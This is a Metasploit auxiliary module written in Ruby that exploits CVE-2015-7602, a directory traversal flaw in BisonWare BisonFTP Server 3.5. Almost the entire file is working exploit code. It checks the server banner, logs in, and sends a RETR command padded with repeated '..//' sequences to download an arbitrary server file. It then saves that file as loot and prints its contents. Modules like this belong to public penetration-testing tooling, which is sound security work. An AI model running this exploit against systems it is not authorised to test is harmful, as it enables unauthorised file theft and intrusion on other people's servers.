##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'			 => 'BisonWare BisonFTP Server Directory Traversal Information Disclosure',
      'Description'	 => %q{
        This module exploits a directory traversal vulnerability found in BisonWare BisonFTP server
        version 3.5. This vulnerability allows an attacker to download arbitrary files from the server
        by crafting a RETR command including file system traversal strings such as '..//.'
      },
      'Platform'		 => 'win',
      'Author'		 =>
        [
          'Jay Turla <@shipcod3>', # msf and initial discovery
          'James Fitts',
          'Brad Wolfe' #brad.wolfe[at]gmail.com
        ],
      'License'		 => MSF_LICENSE,
      'References'	 =>
        [
          [ 'EDB', '38341'],
          [ 'CVE', '2015-7602']
        ],
      'DisclosureDate' => 'Sep 28 2015'))

    register_options(
      [
        OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'boot.ini'])
      ], self.class)

  end

  def check
    connect
    disconnect
    if (banner =~ /BisonWare BisonFTP server product V3.5/)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run_host(target_host)
    begin
      connect_login
      sock = data_connect

      file_path = datastore['PATH']
      file = ::File.basename(file_path)

      # make RETR request and store server response message...
      retr_cmd = ( "..//" * 32 ) + "#{file_path}"
      res = send_cmd( ["RETR", retr_cmd])

      # read the file data from the socket that we opened
      response_data = sock.read(1024)

      if response_data.length == 0
        print_status("File (#{file_path})from #{peer} is empty...")
        return
      end

      # store file data to loot
      loot_file = store_loot("bisonware.ftp.data", "text", rhost, response_data, file, file_path)
      print_status("Stored #{file_path} to #{loot_file}")

      # Read and print the data from the loot file.
      info_disclosure = IO.read(loot_file)
      print_status("Printing contents of #{file_path}")
      print_good("Result:\n #{info_disclosure}")

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    ensure
      data_disconnect
      disconnect
    end
  end
end
